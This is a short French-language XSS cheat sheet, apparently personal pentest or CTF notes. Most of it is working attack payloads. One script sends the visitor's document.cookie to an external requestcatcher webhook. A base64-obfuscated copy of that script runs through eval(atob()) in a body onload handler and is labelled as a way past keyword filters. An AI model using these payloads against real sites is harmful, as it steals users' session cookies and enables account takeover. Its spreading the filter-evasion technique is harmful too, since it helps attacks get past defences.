# Web

## XSS

```js
// Pour tester
<p id="p1">Testarossa</p>
<script>
document.getElementById("p1").innerHTML = "Life found a way !";
</script>
```

Webhook : https://busterbaxter.requestcatcher.com/
```js
// Pour exploiter
<script>
var script = document.createElement("script");
script.src = "https://busterbaxter.requestcatcher.com/" + document.cookie;
document.body.appendChild(script);
</script>:-)

// Pour bypass les filtres qui recherchent des mots clés : base64 encoded payload
<body onload="eval(atob('dmFyIHNjcmlwdCA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoInNjcmlwdCIpO3NjcmlwdC5zcmMgPSAiaHR0cHM6Ly9idXN0ZXJiYXh0ZXIucmVxdWVzdGNhdGNoZXIuY29tLyIgKyBkb2N1bWVudC5jb29raWU7ZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChzY3JpcHQpOw=='))">
```
